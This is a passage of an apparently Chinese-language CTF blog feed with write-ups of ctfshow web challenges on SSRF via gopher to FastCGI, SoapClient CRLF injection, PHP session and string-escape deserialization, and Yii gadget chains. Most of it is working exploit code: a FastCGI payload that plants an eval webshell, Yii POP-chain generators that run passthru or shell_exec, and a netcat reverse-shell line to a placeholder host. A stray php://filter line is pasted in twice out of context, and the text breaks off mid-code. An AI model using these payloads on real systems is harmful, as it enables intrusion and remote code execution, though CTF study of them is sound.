309</h1><p>打的不是mysql了，打的是fastcgi.探测是通过gopher协议的延迟判断的</p>\n<p>gopher://127.0.0.1:9000</p>\n<pre><code class=\"raw\">python2 gopherus.py --exploit fastcgi\nindex.php\necho \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\"\n</code></pre>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web309.jpg\"></p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%20%22/var/www/html/1.php%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>F12添加cookie，访问<code>index.php</code>，再访问<code>1.php</code>，得到shell，之后获取flag</p>\n<h1 id=\"web-310\"><a href=\"#web-310\" class=\"headerlink\" title=\"web 310\"></a>web 310</h1><p>9000和6379都是关着的。那我们可以试试读下配置文件</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'file:///etc/nginx/nginx.conf';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>得到关键信息(抓包获取)</p>\n<pre><code class=\"raw\">    server {\n        listen       4476;\n        server_name  localhost;\n        root         /var/flag;\n        index index.html;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    }\n</code></pre>\n<p>poc</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'http://127.0.0.1:4476';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n}\n$a=new dao();\necho urlcode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>得到flag</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d3333ead/",
            "url": "http://dpm12345.cn/posts/d3333ead/",
            "title": "反序列化",
            "date_published": "2022-10-04T14:16:40.000Z",
            "content_html": "<h1 id=\"web-258\"><a href=\"#web-258\" class=\"headerlink\" title=\"web 258\"></a>web 258</h1><p>相比于上一题多了正则匹配：<code>if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user']))</code></p>\n<p>由构造的序列化字符串，只需将<code>O:</code>改为<code>O:+</code>即可</p>\n<h1 id=\"web-259\"><a href=\"#web-259\" class=\"headerlink\" title=\"web 259\"></a>web 259</h1><p>这个题利用的是php原生类SoapClient<br>该类的构造函数如下：</p>\n<p><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></p>\n<p>flag.php</p>\n<pre><code class=\"php\">$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1'){\n    die('error');\n}else{\n    $token = $_POST['token'];\n    if($token=='ctfshow'){\n        file_put_contents('flag.txt',$flag);\n    }\n}\n</code></pre>\n<p>当然这是个不完整的源码，应该还有一条判断真实ip的也就是</p>\n<pre><code class=\"php\">if($_SERVER['REMOTE_ADDR']==='127.0.0.1'){\nxxxxxx;\n}\n</code></pre>\n<p>所以首先得利用<code>ssrf</code>访问<code>flag.php</code>接着构造post数据<code>token=ctfshow</code>和请求头<code>X-Forwarded-For</code>就能把flag写到flag.txt中了。</p>\n<p>那么ssrf漏洞在哪呢，这就得用到我们前面提到的SoapClient类了。这个类中有个<code>__call</code>魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。</p>\n<p>另外用到的一个文章识点就是CRLF</p>\n<p>大概如下：</p>\n<p>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码</p>\n<p>就比如跳转网站，一般其跳转包为</p>\n<pre><code class=\"html\">HTTP/1.1 302 Moved Temporarily \nDate: Fri, 27 Jun 2014 17:52:17 GMT \nContent-Type: text/html \nContent-Length: 154 \nConnection: close \nLocation: http://xxxx\n</code></pre>\n<p>如果我们将<code>http://xxxx</code>修改为<code>http://xxxx%0axxxx</code></p>\n<p>那么显然<code>Location</code>段会变为</p>\n<pre><code class=\"html\">Location: http://xxxx\nxxxx\n</code></pre>\n<p>这样我们就可以以此来修改跳转包，比如<code>Set-cookie</code>，从而使得进入跳转网站自带cookie</p>\n<p>同理，如果我们将<code>%0a</code>修改为<code>%0d%0a%0d%0a</code>，即两个CRLF(换行)</p>\n<p>那么<code>xxxx</code>会进入HTTP Body，即会显示，如果为<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>那么会显示一张图片，并在错误时进行弹窗</p>\n<p>但由于浏览器的XSS Filter，同时需要注入<code>X-XSS-Protection:0</code>，使得<code>alert</code>正常执行</p>\n<p>由此，我们利用SoapClient进行请求包的构造</p>\n<p>大致结构为</p>\n<pre><code class=\"html\">Content-Type: text/html \nContent-Length: 154 \nLocation: http://127.0.0.1/flag\nX-Forwarded-For:127.0.0.1\n\ntoken=ctfshow\n</code></pre>\n<p>所以payload</p>\n<pre><code class=\"php\">&lt;?php\n\n$url = \"http://127.0.0.1/flag.php\";\n$post = \"token=ctfshow\";\n$a = new SoapClient(null,array('location' =&gt; $url,'user_agent'=&gt;'xx^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded ^^Content-Length:'.(string)strlen($post).'^^^^'.$post,'uri'=&gt;'ssrf'));\n\necho urlencode(str_replace('^^',\"\\r\\n\",serialize($a)));\n</code></pre>\n<h1 id=\"web-260\"><a href=\"#web-260\" class=\"headerlink\" title=\"web 260\"></a>web 260</h1><pre><code class=\"php\">&lt;?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n</code></pre>\n<p>由源码知，只需反序列化后的字符串包含<code>ctfshow_i_love_36D</code>即可</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">&lt;?php\n\n$a = \"ctfshow_i_love_36D\";\n\necho urlencode(serialize($a));\n</code></pre>\n<h1 id=\"web-261\"><a href=\"#web-261\" class=\"headerlink\" title=\"web 261\"></a>web 261</h1><pre><code class=\"php\">&lt;?php\n\nhighlight_file(__FILE__);\n\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __wakeup(){\n        if($this-&gt;username!='' || $this-&gt;password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this-&gt;code);\n    }\n\n    public function __sleep(){\n        $this-&gt;username='';\n        $this-&gt;password='';\n    }\n    public function __unserialize($data){\n        $this-&gt;username=$data['username'];\n        $this-&gt;password=$data['password'];\n        $this-&gt;code = $this-&gt;username.$this-&gt;password;\n    }\n    public function __destruct(){\n        if($this-&gt;code==0x36d){\n            file_put_contents($this-&gt;username, $this-&gt;password);\n        }\n    }\n}\n\nunserialize($_GET['vip']);\n</code></pre>\n<p>这题主要考察魔术方法的应用，</p>\n<p><code>__construct</code>为构造方法，</p>\n<p><code>__wakeup</code>准备对象资源，</p>\n<p><code>__invoke</code>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。 </p>\n<p><code>__sleep()</code>方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 </p>\n<p><code>__unserialize</code>反序列化调用的方法</p>\n<p><code>__destruct</code>析构方法</p>\n<p>而如果类中同时定义了<code>__unserialize</code>和<code>__wakeup()</code>两个魔术方法，则只有<code>__unserialize()</code>方法会生效，<code>__wakeup()</code>方法会被忽略。 </p>\n<p>而在代码中，我们必然只能调用<code>__unserialize</code>和<code>__destruct</code>两个方法</p>\n<p>其中<code>__destruct</code>中由<code>file_put_contents</code>可以想到写一句话到文件里，其只需要<code>$this-&gt;code==0x36d</code>即可</p>\n<p>观察到为<code>==</code>即若等于，那么可以弄出<code>877.phpxxx==0x36d</code>，即控制了文件名，而内容为一句话，也可以控制</p>\n<p>观察到反序列化中均可控，那么可以使<code>$username='877.php'</code>,<code>$password='&lt;?php eval($_POST[1]);?&gt;'</code></p>\n<p>即可成功写入一句话，之后正常rce即可</p>\n<h1 id=\"web262\"><a href=\"#web262\" class=\"headerlink\" title=\"web262\"></a>web262</h1><p>源码</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-03 02:37:19\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-03 16:05:38\n# @message.php\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n\n</code></pre>\n<p>进入后发现并没有提供flag的地方，从头阅读源码，可以看到最上面注释有<code>message.php</code>，访问，得到</p>\n<p>message.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-03 15:13:03\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-03 15:17:17\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg-&gt;token=='admin'){\n        echo $flag;\n    }\n}\n</code></pre>\n<p>阅读代码，可知只需构造一个message类，token为<code>admin</code>即可，故exp.php</p>\n<pre><code class=\"php\">&lt;?php\n    class message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n\necho base64_encode(serialize(new message(\"1\",\"1\",\"1\")));\n</code></pre>\n<p>payload:<code>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIxIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></p>\n<p>设置cookie的msg为此值，得到flag</p>\n<h1 id=\"web-263\"><a href=\"#web-263\" class=\"headerlink\" title=\"web 263\"></a>web 263</h1><p>进入后是一个登陆界面，看似为sql注入，实则不是</p>\n<p>url输入<code>www.zip</code>可以下载题目的源码，可以看到如下文件结构</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web263_1.jpg\"></p>\n<p>index.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-03 16:28:37\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-06 19:21:45\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n    error_reporting(0);\n    session_start();\n    //超过5次禁止登陆\n    if(isset($_SESSION['limit'])){\n        $_SESSION['limti']&gt;5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n        $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n    }else{\n         setcookie(\"limit\",base64_encode('1'));\n         $_SESSION['limit']= 1;\n    }\n    \n?&gt;\n</code></pre>\n<p>check.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-03 16:59:10\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-06 19:15:38\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nrequire_once 'inc/inc.php';\n$GET = array(\"u\"=&gt;$_GET['u'],\"pass\"=&gt;$_GET['pass']);\n\n\nif($GET){\n\n    $data= $db-&gt;get('admin',\n    [\t'id',\n        'UserName0'\n    ],[\n        \"AND\"=&gt;[\n        \"UserName0[=]\"=&gt;$GET['u'],\n        \"PassWord1[=]\"=&gt;$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\n        ]\n    ]);\n    if($data['id']){\n        //登陆成功取消次数累计\n        $_SESSION['limit']= 0;\n        echo json_encode(array(\"success\",\"msg\"=&gt;\"欢迎您\".$data['UserName0']));\n    }else{\n        //登陆失败累计次数加1\n        $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);\n        echo json_encode(array(\"error\",\"msg\"=&gt;\"登陆失败\"));\n    }\n}\n</code></pre>\n<p>inc.php</p>\n<pre><code class=\"php\">&lt;?php\n    ...\n    class User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n    function setStatus($s){\n        $this-&gt;status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this-&gt;username, \"使用\".$this-&gt;password.\"登陆\".($this-&gt;status?\"成功\":\"失败\").\"----\".date_create()-&gt;format('Y-m-d H:i:s'));\n    }\n}\n...\n</code></pre>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p>可以看到在inc.php中，User的<code>__destruct</code>方法有<code>file_put_contents</code>方法，那么可以尝试一句话木马写文件，那么必须创建User对象</p>\n<p>查看源码流程,由于一开始进入，便会设置cookie及session，故略去if为false的情况</p>\n<p>index.php</p>\n<pre><code class=\"php\">$_SESSION['limti']&gt;5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n</code></pre>\n<p>由于在index.php中无User类，故这里有用的只有设置session值</p>\n<p>故还需到check.php中，运行<code>$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);</code></p>\n<p>故设置好cookie的limit值后，前后各访问一次index.php和check.php，就能创建木马文件</p>\n<p>这里用到了<code>PHP的session反序列化漏洞</code>知识，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xMTYyNDYuaHRt\">参考文章</span></p>\n<h2 id=\"php-session反序列化漏洞\"><a href=\"#php-session反序列化漏洞\" class=\"headerlink\" title=\"php session反序列化漏洞\"></a>php session反序列化漏洞</h2><h3 id=\"php-ini-与session有关的配置\"><a href=\"#php-ini-与session有关的配置\" class=\"headerlink\" title=\"php.ini 与session有关的配置\"></a>php.ini 与session有关的配置</h3><pre><code class=\"ini\">session.save_path=\"\"  --设置session的存储路径\nsession.save_handler=\"\" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)\nsession.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动\nsession.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php \n</code></pre>\n<p>其中<code>session.serialize_handler</code>共有三项值，各存储方式如下</p>\n<ul>\n<li><p>php_binary：键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p>\n<p>如：<code>names:6:\"spoock\";</code></p>\n</li>\n<li><p>php：键名+竖线+经过serialize()函数序列处理的值</p>\n<p>如：<code>name|s:6:\"spoock\";</code></p>\n</li>\n<li><p>php_serialize(php&gt;5.5.4)：经过serialize()函数序列化处理的值 </p>\n<p>如：<code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code></p>\n</li>\n</ul>\n<p>当在<code>php</code>引擎设置下解析<code>a:1:{s:4:\"ryat\";s:30:\"|O:1:\"A\":1:{s:1:\"a\";s:2:\"xx\";}</code>时，由于在该设置下会以<code>|</code>为界，左边为key，右边为value，然后进行反序列化，最后得到</p>\n<p><code>a:1:{s:4:\"ryat\";s:30:\"</code> = A类对象</p>\n<p>从而得到一个A类对象</p>\n<p>因此，在这题，可以利用该原理获取一个User类对象</p>\n<p>exp.php</p>\n<pre><code class=\"php\">&lt;?php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n}\n\necho urlencode(base64_encode(\"|\".serialize(new User(\"a.php\",'&lt;?php eval($_POST[1]);?&gt;'))));\n</code></pre>\n<p>[注：这里使用<code>urlencode</code>主要是为了防止影响结果，在做题时因<code>+</code>导致无法出结果]{.red}</p>\n<p>User对象已经构建，按照前面分析进行操作，生成的木马文件为<code>log-a.php</code></p>\n<p>访问</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\Web-vip\\web263_2.jpg\"></p>\n<p>一次post以下，得到flag</p>\n<pre><code class=\"raw\">1=system('ls');\n1=system('tac flag.php');\n</code></pre>\n<h1 id=\"web-264\"><a href=\"#web-264\" class=\"headerlink\" title=\"web 264\"></a>web 264</h1><p>相比较于web262，此时反序列化对象由index.php中的<code>$_SESSION['msg']</code>传递，因此不能像web262那样解题，而是涉及到字符串逃逸。</p>\n<p>这一题的字符串逃逸比较简单</p>\n<p>首先编写以下代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$a = new message(\"\",\"\",\"\");\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到<code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:0:\"\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>复制<code>\";s:5:\"token\";s:5:\"admin\";}</code>，作为构造的结尾</p>\n<p>再编写代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$a = new message(\"\",\"\",'\";s:5:\"token\";s:5:\"admin\";}');\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到<code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:27:\"\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>可以看到，构造的结尾共有27个字符，而<code>fuck</code>替换为<code>loveU</code>增加了一个字符，故共需要27个<code>fuck</code></p>\n<p>编写如下代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$s = str_repeat(\"fuck\",27);\necho $s.'\";s:5:\"token\";s:5:\"admin\";}',\"&lt;/br&gt;\";\n$a = new message(\"\",\"\",$s.'\";s:5:\"token\";s:5:\"admin\";}');\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}\nO:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:135:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}\n</code></pre>\n<p>经检查，<code>to</code>替换后135的末尾恰为最后一个<code>loveU</code>的结尾，故构造正确</p>\n<p>因此payload:<code>?f=&amp;m=&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>提交后，再访问message.php，由于需要设置cookie的msg值，故设置，刷新网页，得到flag</p>\n<h1 id=\"web-265\"><a href=\"#web-265\" class=\"headerlink\" title=\"web 265\"></a>web 265</h1><p>php按地址传参</p>\n<p>变量引用</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n\n    public function __construct($t,$p){\n        $this-&gt;token=$t;\n        $this-&gt;password = &amp;$this-&gt;token;\n    }\n    public function login(){\n        return $this-&gt;token===$this-&gt;password;\n    }\n}\n\n$a = new ctfshowAdmin(\"\",'');\n\necho urlencode(serialize($a));\n</code></pre>\n<h1 id=\"web-266\"><a href=\"#web-266\" class=\"headerlink\" title=\"web 266\"></a>web 266</h1><p>PHP特性：函数名和类名不区分大小写，变量名区分。</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-04 23:52:24\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-05 00:17:08\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nhighlight_file(__FILE__);\n\ninclude('flag.php');\n$cs = file_get_contents('php://input');\n\n\nclass ctfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function login(){\n        return $this-&gt;username===$this-&gt;password;\n    }\n    public function __toString(){\n        return $this-&gt;username;\n    }\n    public function __destruct(){\n        global $flag;\n        echo $flag;\n    }\n}\n$ctfshowo=@unserialize($cs);\nif(preg_match('/ctfshow/', $cs)){\n    throw new Exception(\"Error $ctfshowo\",1);\n}\n</code></pre>\n<p>payload:<code>O:7:\"Ctfshow\":0:{}</code></p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web266.jpg\"></p>\n<h1 id=\"web-267\"><a href=\"#web-267\" class=\"headerlink\" title=\"web 267\"></a>web 267</h1><p>弱密码登入admin/admin</p>\n<p>查看源码知view-source</p>\n<p>在page下找到反序列换入口</p>\n<pre><code class=\"php\">unserialize(base64_decode($_GET['code']))\n</code></pre>\n<p>这里为<code>yii</code>的反序列化链</p>\n<p>只有<code>passthru</code>有回显</p>\n<p>最后的payload：</p>\n<pre><code class=\"raw\">?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19\n</code></pre>\n<p>脚本</p>\n<pre><code class=\"php\">&lt;?php\n\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'passthru';\n            $this-&gt;id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this-&gt;formatters['close'] = [new CreateAction, 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this-&gt;_dataReader = new Generator;\n        }\n    }\n}\nnamespace{\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\n}\n\n?&gt;\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwczovL21wLndlaXhpbi5xcS5jb20vcz9fX2Jpej1NelU1TURJME9ESTVNUT09Jm1pZD0yMjQ3NDg1MTI5JmlkeD0xJnNuPWIyN2UzZmU4NDVkYWVlMmZiMTNiYjlmMzZmNTNhYjQw\">复现文章2</span></p>\n<h1 id=\"web-268\"><a href=\"#web-268\" class=\"headerlink\" title=\"web 268\"></a>web 268</h1><pre><code class=\"php\">&lt;?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'phpinfo';\n            $this-&gt;id = '1';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为 isRunning\n            $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\n// poc2\nnamespace Codeception\\Extension{\n    use Faker\\Generator;\n    class RunProcess{\n        private $processes;\n        public function __construct()\n        {\n            $this-&gt;processes = [new Generator()];\n        }\n    }\n}\nnamespace{\n    // 生成 poc\n    echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));\n}\n?&gt;\n</code></pre>\n<h1 id=\"web-269\"><a href=\"#web-269\" class=\"headerlink\" title=\"web 269\"></a>web 269</h1><pre><code class=\"php\">&lt;?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'phpinfo';\n            $this-&gt;id = '1';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // 这里需要改为 isRunning\n            $this-&gt;formatters['render'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\n\n    use Faker\\Generator;\n\n    class See{\n        protected $description;\n        public function __construct()\n        {\n            $this-&gt;description = new Generator();\n        }\n    }\n}\nnamespace{\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\n    class Swift_KeyCache_DiskKeyCache{\n        private $keys = [];\n        private $path;\n        public function __construct()\n        {\n            $this-&gt;path = new See;\n            $this-&gt;keys = array(\n                \"axin\"=&gt;array(\"is\"=&gt;\"handsome\")\n            );\n        }\n    }\n    // 生成 poc\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\n}\n?&gt;\n</code></pre>\n<h1 id=\"web-270\"><a href=\"#web-270\" class=\"headerlink\" title=\"web 270\"></a>web 270</h1><p>也可以反弹shell</p>\n<p><code>$exp = new \\yii\\db\\BatchQueryResult('shell_exec', \"nc xx.xx.xx.xx port -e /bin/sh\");</code></p>\n<pre><code class=\"php\">&lt;?php\nnamespace yii\\rest {\n    class Action\n    {\n        public $checkAccess;\n    }\n    class IndexAction\n    {\n        public function __construct($func, $param)\n        {\n            $this-&gt;checkAccess = $func;\n            $this-&gt;id = $param;\n        }\n    }\n}\nnamespace yii\\web {\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct($func, $param)\n        {\n            $this-&gt;writeCallback = [new \\yii\\rest\\IndexAction($func, $param), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct($func, $param)\n        {\n            $this-&gt;_dataReader = new \\yii\\web\\DbSession($func, $param);\n        }\n    }\n}\nnamespace {\n    $exp = new \\yii\\db\\BatchQueryResult('shell_exec', 